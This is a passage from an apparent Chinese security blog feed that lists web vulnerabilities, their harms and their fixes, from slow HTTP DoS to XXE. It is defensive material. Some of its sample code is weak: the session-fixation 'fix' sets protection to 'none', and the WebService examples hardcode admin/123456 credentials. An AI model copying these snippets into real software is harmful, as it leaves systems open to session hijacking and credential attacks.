 <p> Header always append X-Frame-Options”DENY”  </p><h3 id="缓慢的-http-拒绝服务攻击漏洞"><a href="#缓慢的-http-拒绝服务攻击漏洞" class="headerlink" title="缓慢的 http 拒绝服务攻击漏洞"></a>缓慢的 http 拒绝服务攻击漏洞</h3><p><strong>漏洞危害：</strong></p><p>缓慢的 http 拒绝服务攻击是一种专门针对于 Web 的应用层拒绝服务攻击，攻击者操纵网络上的肉鸡，对目标Web服务器进行海量http request攻击，直到服务器带宽被打满，造成了拒绝服务。  </p><p>慢速HTTP拒绝服务攻击经过不断的演变和发展，主要有三种攻击类型，分别是Slow headers、Slow body、</p><p>Slow read。以Slowheaders为例，Web应用在处理HTTP请求之前都要先接收完所有的HTTP头部，因为 HTTP头部中包含了一些Web应用可能用到的重要的信息。攻击者利用这点，发起一个HTTP请求，一直不停的发送 HTTP 头部，消耗服务器的连接和内存资源。抓包数据可见，攻击客户端与服务器建立TCP 连接后，每40秒才向服务器发送一个HTTP头部，而Web服务器再没接收到2个连续的 时，会认为客户端没有发送完头部，而持续的等等客户端发送数据。如果恶意攻击者客户端持续建立这样的连接，那么服务器上可用的连接将一点一点被占满，从而导致拒绝服务。这种攻击类型称为慢速HTTP拒绝服务攻击。</p><p><strong>修复建议：</strong></p><p>建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。  </p><p>1、 mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：  </p><p>#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。  </p><p>RequestReadTimeoutheader=10-40,minrate=500  </p><p>#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。  </p><p>RequestReadTimeoutbody=10-40,minrate=500  </p><p>需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。  </p><p>2、 mod_qos用于控制并发连接数。配置例如：  </p><p># 当服务器并发连接数超过600时，关闭keepalive  </p><p>QS_SrvMaxConnClose 600  </p><p># 限制每个源IP最大并发连接数为50  </p><p>QS_SrvMaxConnPerIP 50</p><h3 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h3><p><strong>漏洞危害：</strong></p><p>会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。</p><p><strong>修复方案：</strong></p><p>可以是在用户登录成功后重新创建一个session id,而不是用原来的那个id。在spring security中，默认就带了这个方案，有session-fixation-protection。 </p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&apos;true&apos; session-fixation-protection=&quot;none&quot;&gt;  </span><br><span class="line"></span><br><span class="line">    &lt;intercept-url pattern=&quot;/admin.jsp&quot; access=&quot;ROLE_ADMIN&quot; /&gt;  </span><br><span class="line"></span><br><span class="line">    &lt;intercept-url pattern=&quot;/**&quot; access=&quot;ROLE_USER&quot; /&gt;  </span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure><h3 id="CSP未设置"><a href="#CSP未设置" class="headerlink" title="CSP未设置"></a>CSP未设置</h3><p><strong>漏洞危害：</strong></p><p>CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。</p><p>CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。</p><p>作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行</p><p><strong>修复建议：</strong></p><p>配置内容安全策略涉及到添加 Content-Security-Policy  HTTP头部到一个页面，并配置相应的值，以控制用户代理（浏览器等）可以为该页面获取哪些资源。比如一个可以上传文件和显示图片页面，应该允许图片来自任何地方，但限制表单的action属性只可以赋值为指定的端点。一个经过恰当设计的内容安全策略应该可以有效的保护页面免受跨站脚本攻击。本文阐述如何恰当的构造这样的头部，并提供了一些例子。</p><p>制定策略</p><p>你可以使用  Content-Security-Policy HTTP来指定你的策略，像这样:</p><p>Content-Security-Policy: policy</p><p>policy参数是一个包含了各种描述你的CSP策略指令的字符串。</p><h3 id="URL重定向-跳转漏洞"><a href="#URL重定向-跳转漏洞" class="headerlink" title="URL重定向/跳转漏洞"></a>URL重定向/跳转漏洞</h3><p><strong>漏洞危害：</strong></p><p> 恶意用户完全可以借用URL跳转漏洞来欺骗安全意识低的用户，从而导致“中奖”之类的欺诈，这对于一些有在线业务的企业如淘宝等，危害较大，同时借助URL跳转，也可以突破常见的基于“白名单方式”的一些安全限制，如传统IM里对于URL的传播会进行安全校验，但是对于大公司的域名及URL将直接允许通过并且显示会可信的URL，而一旦该URL里包含一些跳转漏洞将可能导致安全限制被绕过。如果引用一些资源的限制是依赖于“白名单方式”，同样可能被绕过导致安全风险，譬如常见的一些应用允许引入可信站点如youku.com的视频，限制方式往往是检查URL是否是youku.com来实现，如果youku.com内含一个url跳转漏洞，将导致最终引入的资源属于不可信的第三方资源或者恶意站点，最终导致安全问题。</p><p><strong>修复建议：</strong></p><p>理论上讲，url跳转属于CSRF的一种，我们需要对传入的URL做有效性的认证，保证该URL来自于正确的地方，限制的方式同防止csrf一样可以包括：</p><p>1 referer的限制</p><p>如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接</p><p>2 加入有效性验证Token</p><p>我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。</p><h3 id="Cookie-缺少-HttpOnly属性漏洞"><a href="#Cookie-缺少-HttpOnly属性漏洞" class="headerlink" title="Cookie 缺少 HttpOnly属性漏洞"></a>Cookie 缺少 HttpOnly属性漏洞</h3><p><strong>漏洞危害：</strong></p><p> 会话 cookie 中缺少 HttpOnly 属性会导致攻击者可以通过程序(JS 脚本、Applet 等)获取到用户的</p><p>cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁。</p><p>HttpOnly 是微软对 cookie 做的扩展，该值指定 cookie 是否可通过客户端脚本访问。Microsoft </p><p>Internet Explorer 版本 6 Service Pack 1 和更高版本支持cookie属性HttpOnly。 </p><p>如果在Cookie中没有设置HttpOnly属性为true，可能导致Cookie被窃取。窃取的Cookie可以包含标识站点用户的敏感信息，如ASP.NET会话ID或Forms身份验证票证，攻击者可以重播窃取的Cookie，以便伪装成用户或获取敏感信息，进行跨站脚本攻击等。 </p><p>如果在Cookie中设置HttpOnly属性为true，兼容浏览器接收到HttpOnly cookie，那么客户端通过</p><p>程序(JS脚本、Applet等)将无法读取到Cookie信息，这将有助于缓解跨站点脚本威胁。</p><p><strong>修复建议：</strong></p><p>向所有会话cookie中添加“HttpOnly”属性。 </p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java示例： </span><br><span class="line"></span><br><span class="line">HttpServletResponse response2 =(HttpServletResponse)response; response2.setHeader( \&quot;Set-Cookie\&quot;,\&quot;name=value; HttpOnly\&quot;);</span><br></pre></td></tr></table></figure><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C#示例： </span><br><span class="line"></span><br><span class="line">HttpCookie myCookie = newHttpCookie(\&quot;myCookie\&quot;); myCookie.HttpOnly = true; </span><br><span class="line"></span><br><span class="line">Response.AppendCookie(myCookie);</span><br></pre></td></tr></table></figure><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VB.NET示例： </span><br><span class="line"></span><br><span class="line">Dim myCookie As HttpCookie = newHttpCookie(\&quot;myCookie\&quot;) myCookie.HttpOnly = True </span><br><span class="line"></span><br><span class="line">Response.AppendCookie(myCookie)</span><br></pre></td></tr></table></figure><h3 id="不安全的-HTTP-方法漏洞"><a href="#不安全的-HTTP-方法漏洞" class="headerlink" title="不安全的 HTTP 方法漏洞"></a>不安全的 HTTP 方法漏洞</h3><p><strong>漏洞危害：</strong></p><p> Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, </p><p>PROPPATCH, MKCOL ,LOCK ,UNLOCK 。这些方法表示可能在服务器上使用了 WebDAV。由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><p><strong>修复建议：</strong></p><p>如果服务器不需要支持 WebDAV，请务必禁用它或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p><h3 id="信息泄露漏洞、非授权文件包含"><a href="#信息泄露漏洞、非授权文件包含" class="headerlink" title="信息泄露漏洞、非授权文件包含"></a>信息泄露漏洞、非授权文件包含</h3><p><strong>漏洞危害：</strong></p><p> 攻击者通过目录遍历攻击可以获取系统文件及服务器的配置文件等。一般来说，他们利用服务器API、文件标准权限进行攻击。严格来说，目录遍历攻击并不是一种web漏洞，而是网站设计人员的设计“漏洞”。如果web设计者设计的web内容没有恰当的访问控制，允许http遍历，攻击者就可以访问受限的目录，并可以在web根目录以外执行命令。</p><p>目录遍历是针对Windows IIS和Apache的一种常见攻击方法，它可能让攻击者访问受限制的目录，通过执行cmd.exe /c命令来提取目录信息，或者在Web服务器的根目录以外执行命令。目录遍历漏洞可能存在于Web服务器软件本身，也可能存在于Web应用程序之中。</p><p><strong>修复建议：</strong></p><p> 1、 系统开发阶段的防御 </p><p>在系统开发阶段应充分考虑系统的安全性，对目录遍历漏洞来说，需对用户提交的内容进行严格的过滤，这里主要指过滤目录跳转符，字符截断符，dir命令等。 </p><p>2、 系统运行阶段的防御 </p><p>系统运维人员需有强烈的安全意识，他们的一举一动都会影响用户的个人隐私信息安全。对系统运维人员来说，部署新的业务系统或者安装新的软件或应用后应通过web扫描工具积极查找系统是否存在目录遍历漏洞，尽可能不要在服务器上安装与业务不相关的第三方软件以避免引入目录遍历漏洞。除此之外，还应该合理配置web服务器（禁止目录浏览，分配好目录权限等）并积极关注所使用的各种软件和应用的版本发布情况，及时升级新的软件版本。 </p><p>不同web服务器禁止目录浏览方法有所不同。对IIS而言，如果不需要可执行的CGI，可以删除可执行虚拟目录或直接关闭目录浏览；如果确实需要可执行的虚拟目录，建议将可执行的虚拟目录单独放在一个分区。 </p><p>对于Apache而言，管理员需要修改配置文件，禁止浏览列出目录和文件列表，如可通过修改conf目录下的 httpd.conf 文件来禁止使用目录索引。以 Apache 2.2.25 版本为例，打开 httpd.conf 文件将 “Options IndexesFollowSymLinks”中的“Indexes”删除，这样web目录下的所有目录都不再生成索引。</p><p>为更好的保护系统安全，实际生产环境和测试开发环境应该隔离。在生产环境中的任何改动，都需要严格遵循变更管理流程，做到执行人、执行时间、执行对象和具体改动均记录在案，并有企业信息安全部门进行事前审核和事后审计。技术人员一般不要直接调试生产系统，可以在测试环境中调试完成后再更新生产系统，以避免调试过程中开启某些接口、更改某些配置或者保存某些调试信息造成安全隐患。如果非要在线调试生产系统，而且需要保存调试信息时，应避免将调试信息直接保存到服务器本地，同时调试完成后应第一时间删除相关调试信息并恢复系统配置。</p><p>3、安全设备的防御进行目录遍历攻击时，攻击者基本都会使用目录跳转符，同时可能配合使用字符截断符，dir命令等。对专业的安全设备来说通过检测特定语法下的目录跳转符，字符截断符，以及与查看目录相关的命令即可识别各种目录遍历攻击。部署专业的安全设备不仅可以很好的保护业务系统自身的目录遍历漏洞，同时还能防御web服务器和服务器上其他非业务相关的第三方应用漏洞引发的目录遍历攻击。</p><h3 id="WebService未授权访问"><a href="#WebService未授权访问" class="headerlink" title="WebService未授权访问"></a>WebService未授权访问</h3><p><strong>漏洞危害：</strong></p><p> 在访问的过程中，并没有对敏感信息进行身份验证与授权,如果这样，攻击者很可能会利用弱的身份验证与授权机制对信息进行访问.包括:</p><p>a):没有使用身份验证或在未加密的通信通道中使用基本身份验证。</p><p>b):密码在 SOAP 头信息中以明文形式传递。</p><p> <strong>修复建议</strong></p><p>可以一下几种方法来实现身份验证。</p><p>方法一：在WebService中引入SoapHeader</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#region 配置登录标头  </span><br><span class="line"></span><br><span class="line">/// &lt;summary&gt;  </span><br><span class="line"></span><br><span class="line">/// Code CreateBy BanLao  </span><br><span class="line"></span><br><span class="line">/// &lt;/summary&gt;  </span><br><span class="line"></span><br><span class="line">public class MySoapHeader: SoapHeader  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    private string strUserName =string.Empty;  </span><br><span class="line"></span><br><span class="line">    private string strPassWord =string.Empty;  </span><br><span class="line"></span><br><span class="line">      public MySoapHeader() &#123; &#125;  </span><br><span class="line"></span><br><span class="line">      public MySoapHeader(string username,string password)  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        this.strUserName = username;  </span><br><span class="line"></span><br><span class="line">        this.strPassWord = password;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    #region 构造 用户名|密码  </span><br><span class="line"></span><br><span class="line">    public string UserName  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        get &#123; return strUserName; &#125;  </span><br><span class="line"></span><br><span class="line">        set &#123; strUserName = value; &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    public string PassWord  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        get &#123; return strPassWord; &#125;  </span><br><span class="line"></span><br><span class="line">        set &#123; strPassWord = value; &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    public bool CheckLogin()  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        if (strUserName == &quot;合法登录名&quot; &amp;&amp; strPassWord == &quot;合法登录密码&quot;)  </span><br><span class="line"></span><br><span class="line">        &#123; </span><br><span class="line"></span><br><span class="line">            return true;  </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        else </span><br><span class="line"></span><br><span class="line">        &#123; </span><br><span class="line"></span><br><span class="line">            return false;  </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    #endregion </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">#endregion</span><br></pre></td></tr></table></figure><p>方法二：Web Service以Session方式验证</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[WebMethod(Description =&quot;检测是否正确登录&quot;, EnableSession = true)]  </span><br><span class="line"></span><br><span class="line">public boolCheckLogin(string strUserName, string strPassword)  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    if (strUserName.Equals(&quot;admin&quot;)&amp;&amp; strPassword.Equals(&quot;123456&quot;))  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        Session[&quot;LoginState&quot;] =true;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        Session[&quot;LoginState&quot;] =false;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    return (bool)Session[&quot;LoginState&quot;];  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"> #region 测试连接  </span><br><span class="line"></span><br><span class="line">[WebMethod(Description =&quot;测试连接&quot;, EnableSession = true)]  </span><br><span class="line"></span><br><span class="line">public string_GetValue(string strInputValue)  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    if (Session[&quot;LoginState&quot;] == null|| Session[&quot;LoginState&quot;].Equals(false))  </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        return &quot;无效的身份验证，请重试！&quot;;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">    &#123;  </span><br><span class="line"></span><br><span class="line">        string strReturnValue = strInputValue +&quot;@CopyRight By BanLao 2010&quot;;  </span><br><span class="line"></span><br><span class="line">        return strReturnValue;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">#endregion</span><br></pre></td></tr></table></figure><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p><strong>漏洞危害：</strong></p><p> 文件包含漏洞，如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，简单来说就是攻击者通过浏览器、url地址或者是一个参数的变量的内容，可以通过修改这些url或者参数变量的内容，读取到web根目录以前其他文件。主要包括本地文件包含和远程文件包含两种形式。</p><p><strong>修复建议：</strong></p><p>1、 严格检查变量是否已经初始化。 </p><p>2、 建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。 </p><p>3、 严格检查include类的文件包含函数中的参数是否外界可控。 </p><p>4、 不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 </p><p>5、 在发布应用程序之前测试所有已知的威胁。</p><h3 id="用户信息泄漏"><a href="#用户信息泄漏" class="headerlink" title="用户信息泄漏"></a>用户信息泄漏</h3><p><strong>漏洞危害：</strong></p><p>用户信息泄漏，导致个人资料的曝光与财产损失的不断增加。</p><p><strong>修复建议：</strong></p><p>对用户的敏感信息加强控制，使攻击者无法获取到用户的个人资料。</p><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><strong>漏洞危害：</strong></p><p> 文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。 </p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell 以方便后续进入系统。攻击者在受影响系统放置或者插入</p><p>WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p><p><strong>修复建议：</strong></p><p>1、 系统开发阶段的防御 </p><p>系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00 截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。</p><p>2、 系统运行阶段的防御 </p><p>系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</p><p>3、 安全设备的防御 </p><p>文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</p><h3 id="组件配置不当"><a href="#组件配置不当" class="headerlink" title="组件配置不当"></a>组件配置不当</h3><p> 组件配置不当是非常普遍的安全问题，主要是由于运维人员配置相关组件时考虑不严谨导致。解决方法一般是重新梳理需求，依据最小权限原则严格配置相关组件，并移除不使用的或非必要的组件。</p><h3 id="接口返回数据问题"><a href="#接口返回数据问题" class="headerlink" title="接口返回数据问题"></a>接口返回数据问题</h3><p>此问题是由于接口控制不严导致，解决方法一般是严格控制查询接口和响应数据，不需要返回的数据不返回给客户端。</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p><strong>漏洞危害：</strong></p><p> 当应用在调用一些能将字符转化为代码的函数(如 PHP 中的 eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞，使得攻击者可以执行任意代码，危害性极大。</p><p><strong>修复建议：</strong></p><p>1、 使用json保存数组，当读取时就不需要使用eval了 </p><p>2、 对于必须使用eval的地方，一定严格处理用户数据 </p><p>3、 字符串使用单引号包括可控代码，插入前使用addslashes转义 </p><p>4、 放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换 </p><p>5、 若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象</p><h3 id="DNS-区域传送漏洞"><a href="#DNS-区域传送漏洞" class="headerlink" title="DNS 区域传送漏洞"></a>DNS 区域传送漏洞</h3><p><strong>漏洞危害：</strong></p><p> DNS是整个互联网公司业务的基础，目前越来越多的互联网公司开始自己搭建DNS服务器做解析服务，同时由于DNS服务是基础性服务非常重要，因此很多公司会对DNS服务器进行主备配置而DNS主备之间的数据同步就会用到dns域传送，但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。而泄露的类似内部域名，其安全性相对较低，更容易遭受攻击者的攻击，比较典型的譬如内部的测试机往往就会缺乏必要的安全设置。</p><p><strong>修复建议：</strong></p><p>在相应的zone、options中添加allow-transfer限制可以进行同步的服务器，可以有两种方式：限制IP、使用key认证。</p><h3 id="POODLE-attack"><a href="#POODLE-attack" class="headerlink" title="POODLE attack"></a>POODLE attack</h3><p><strong>漏洞危害：</strong></p><p>SSL v3爆出漏洞，攻击者可利用该漏洞获取安全连接当中的明文内容。</p><p><strong>修复建议：</strong></p><p>可以禁用SSL3.0，或SSL3.0中的CBC模式加密，但是有可能造成兼容性问题。</p><p>建议支持TLS_FALLBACK_SCSV，这可以解决重试连接失败的问题，从而防止攻击者强制浏览器使用SSL3.0。</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><strong>漏洞危害：</strong></p><p>XXE漏洞会导致读取任意未授权文件，如读取服务器中的/etc/passwd文件；因为基于树的XML解析器会把全部加载到内存中，因此XXE漏洞也有可能被用来恶意消耗内存进行拒绝服务攻击。</p><p><strong>修复建议：</strong></p><p>在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议。</p><p>了解所使用的XML解析器是否默认解析外部实体，如果默认解析应根据实际情况进行关闭或者限制。</p><p>1.检查所使用的底层xml解析库，默认禁止外部实体的解析 </p><p>2.使用第三方应用代码及时升级补丁 </p><p>3.同时增强对系统的监控，防止此问题被人利用对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用这样一个函数</p><h3 id="参数污染漏洞"><a href="#参数污染漏洞" class="headerlink" title="参数污染漏洞"></a>参数污染漏洞</h3><p><strong>漏洞危害：</strong></p><p>HTTP 参数污染攻击指的是攻击者在请求中构造多个参数名相同的参数，由于不同的服务器端脚本语言在处理相同参数名的参数时，可能选用的参数值与参数的先后顺序有关。  </p><p>比如提交的请求中包含参数 name=value0&amp;name=value1, 不同的服务器端脚本语言获取到的 name 的值可能为value0, 也可能为value1。 </p><p>攻击者可利用参数污染请求进行以下攻击：  </p><p>1)硬编码HTTP请求参数  </p><p>2)修改正常应用行为  </p><p>3)绕过web应用防火墙的防护</p><p><strong>修复建议：</strong></p><p>对于要求输入参数为整型的参数，校验输入参数值。  </p><p>对于输入参数为字符串类型的参数，校验参数值中是否包含可用于分割参数的分隔符，比如&amp; %26等。</p></ifmoduleheaders_module>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞危害与修复–-WEB&quot;&gt;&lt;a href=&quot;#漏洞危害与修复–-WEB&quot; class=&quot;headerlink&quot; title=&quot;漏洞危害与修复–  WEB&quot;&gt;&lt;/a&gt;漏洞危害与修复–  WEB&lt;/h2&gt;&lt;h3 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>console中爆破数据加密传输的思路</title>
    <link href="https://www.3cac.com/2018/08/12/console%E4%B8%AD%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.3cac.com/2018/08/12/console中爆破数据加密传输的思路/</id>
    <published>2018-08-12T03:30:41.000Z</published>
    <updated>2019-08-20T16:19:48.271Z</updated>
    
